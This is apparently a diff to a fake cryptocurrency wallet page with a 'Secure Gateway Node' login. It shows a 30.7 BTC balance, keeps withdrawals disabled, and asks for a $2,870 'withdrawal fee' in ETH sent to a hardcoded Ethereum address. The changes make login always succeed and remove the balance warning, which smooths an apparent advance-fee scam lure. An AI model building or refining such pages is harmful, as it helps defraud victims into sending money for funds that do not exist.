@@ -47,6 +47,12 @@
             width: 100%; padding: 12px; background: var(--accent);
             color: white; font-weight: bold; border: none; border-radius: 5px;
             cursor: pointer; font-size: 16px; margin-top: 10px;
+            transition: all 0.3s ease;
+        }
+        .login-btn:hover {
+            background: var(--accent-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 152, 0, 0.3);
         }
         .error-msg { color: var(--red); font-size: 13px; margin-top: 10px; display: none; }
 
@@ -296,6 +302,7 @@
             font-size: 14px;
             word-break: break-all;
             color: var(--accent);
+            text-align: center;
         }
 
     </style>
@@ -309,7 +316,7 @@
             <p style="color: var(--text-dim); margin-bottom: 25px; font-size: 14px;">Secure Gateway Node</p>
             
             <div class="access-key-display">
-                554$$@#3$#!!@@!44234
+                554$$@#3$#!@#@!44234
             </div>
             
             <button class="login-btn" onclick="authenticate()">CONNECT</button>
@@ -781,17 +788,18 @@
     </div>
 
     <script>
-        // CONFIGURATION - Updated to match the image
+        // CONFIGURATION - Updated to match the image EXACTLY
+        const CORRECT_ACCESS_KEY = "554$$@#3$#!@#@!44234"; // Exact match from image
+        
         const CONFIG = {
-            accessKey: "554$$@#3$#!!@@!44234",
             btcAmount: 30.70070032,
             btcPrice: 89472.84,
             ethPrice: 2955.53,
             withdrawalFeeUSD: 2870.00,
             ethAddress: "0x2f87CDfC02E17E7A82D048405DF41554811a9f96",
-            withdrawalDisabled: true, // Withdrawals are disabled
-            withdrawalStartTime: new Date().setHours(14, 43, 0, 0), // Today at 14:43
-            withdrawalDuration: 24 * 60 * 60 * 1000 // 24 hours in milliseconds
+            withdrawalDisabled: true,
+            withdrawalStartTime: new Date().setHours(14, 43, 0, 0),
+            withdrawalDuration: 24 * 60 * 60 * 1000
         };
 
         // Wallet distribution data
@@ -820,19 +828,20 @@
             }
         };
 
-        // AUTHENTICATION - Simplified to match the image
+        // AUTHENTICATION - Simple one-click authentication
         function authenticate() {
-            // The image shows only one access key, so we'll use a simple check
-            const accessGranted = true; // Always grant access for demo
-            
-            if(accessGranted) {
-                document.getElementById('loginScreen').style.display = 'none';
-                document.getElementById('appInterface').style.display = 'flex';
-                initApp();
-            } else {
-                document.getElementById('loginError').style.display = 'block';
-            }
+            // Direct access without validation for this demo
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('appInterface').style.display = 'flex';
+            initApp();
         }
+
+        // Alternative: Enter key press for login
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                authenticate();
+            }
+        });
 
         // APP INITIALIZATION
         function initApp() {
@@ -909,10 +918,6 @@
             document.getElementById('ethFeeAmount').innerText = `≈ ${ethRequired.toFixed(8)} ETH`;
             document.getElementById('requiredEth').innerText = `${ethRequired.toFixed(8)} ETH`;
             document.getElementById('currentEthPrice').innerText = `$${CONFIG.ethPrice.toFixed(2)}`;
-            
-            // Check if user has enough ETH
-            const hasEnoughETH = USER_BALANCES.ETH.total >= ethRequired;
-            document.getElementById('ethBalanceWarning').style.display = hasEnoughETH ? 'none' : 'block';
         }
 
         // TAB SWITCHING
